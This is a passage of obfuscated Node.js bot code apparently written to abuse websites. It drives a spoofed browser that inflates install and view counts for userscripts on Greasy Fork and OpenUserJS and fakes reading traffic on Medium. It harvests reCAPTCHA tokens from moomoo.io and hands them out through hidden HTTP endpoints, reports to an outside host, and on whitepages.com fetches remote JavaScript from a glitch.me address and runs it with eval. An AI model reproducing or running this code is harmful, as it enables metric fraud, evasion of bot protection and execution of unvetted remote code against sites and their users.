      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + Y(0x5) + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + Z(0x4, 'ON8$') + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + a0(0xe) + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + Y(0x13) + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + Z(0x1a, 'jIDC') + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x753 + -0x1 * 0x25c2 + 0x1e6f
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    const a2 = c;
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x482 * -0x1 + -0x101e + 0x14a0)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            const a1 = c;
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios[a1(0x17)](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags[a2(0x3) + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x814 + -0x5 * 0x101 + -0x1 * -0xd7d), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0x1a * -0xec + 0x232 * 0x3 + -0x1e2a), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x7f * -0x1b + -0xbab * 0x1 + -0x322 * -0x8;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x1 * 0x541 + 0x11b * 0x13 + -0xfc0; w < getRandomInt(0x1953 + 0x2400 + 0x2 * -0x1ea9, -0x417 * -0x4 + 0x1e50 + -0x3 * 0xf8d); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x5f6e + 0x814d + -0x1 * -0x9a5);
        }
      }();
    }, -0x1 * -0x1a53 + -0xe8a + -0xb65), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        const a3 = b;
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + a3(0x2, 'vIDO')],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x891 * 0x1 + 0x1dc3 + -0x16 * 0x1be;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x4 * -0x55 + -0x17 * 0x49 + -0x2a1 * -0x3, -0x9 * -0x108 + -0x1 * 0x37e + 0xb3 * -0x8)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x29d5 * 0x1 + -0x29c * -0x3d + -0x53d1);
    }, -0x1b79 + 0x1 * 0x19cf + 0x107 * 0x2), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x188a + 0x817 + 0x1073;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0x187f * -0x1 + -0x1de5 + -0x210e * -0x2), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x145d * 0x1 + 0x19f1 * -0x1 + -0x2 * -0x1727), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0xb48 * -0x7a + -0x9ea14 + 0xe8302 * 0x2);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x8ef + -0x20e * 0x7 + 0x17b5);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const a4 = d,
      i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0x537 + 0x3 * 0x3df + -0x1 * 0x59e);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write'](a4(0x1)), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x16ef + -0x1a4e + 0x50cd);
}
doFlags['doOUJS'] && ((async () => {
  const a5 = d;
  async function f() {
    const k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0x1538 + 0x5 * -0x1b1 + 0x1dae) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x2297 + -0x26f1 + 0x45b));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x1 * 0x557 + 0x2414 + -0x1ebd, D['indexOf']('\x20'));
        return B ? E['slice'](0x5 * 0x33a + 0x2129 + -0x314b, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0xc47 * 0x6 + 0x4a9a + -0xa * -0x3d0),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x4bdd + 0x4d1c + -0x71e9),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + a5(0x9),
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x1bbb + -0x18 * -0xa + -0x1 * -0x1acb; k < -0x1b9c + 0x3c5 + 0x17db; k++)
    setTimeout(f, (0x3d1 * -0x6b + -0xcd22 + -0x1f67 * -0x1b) * k * getRandomInt(-0xd14 * -0x1 + -0x4 * 0x23d + -0x41f, 0x1c6d + -0x21f * -0x9 + -0x2f81));
  setInterval(() => {
    f();
    for (let l = 0x1064 + 0x1 * -0x17d5 + 0x771 * 0x1; l < 0x751 + -0xd5e + 0x611; l++)
      setTimeout(f, (0x49b1 + -0x1c16 * 0x1 + -0x25c1 * -0x5) * l * getRandomInt(0x116 * -0x3 + 0x1ba8 * -0x1 + 0x1eeb * 0x1, -0x9c2 * -0x1 + -0x244c * 0x1 + 0x1a8d));
  }, -0x1d5231 * -0x1 + 0x1 * -0x27da4d + -0x5748d * -0xc);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
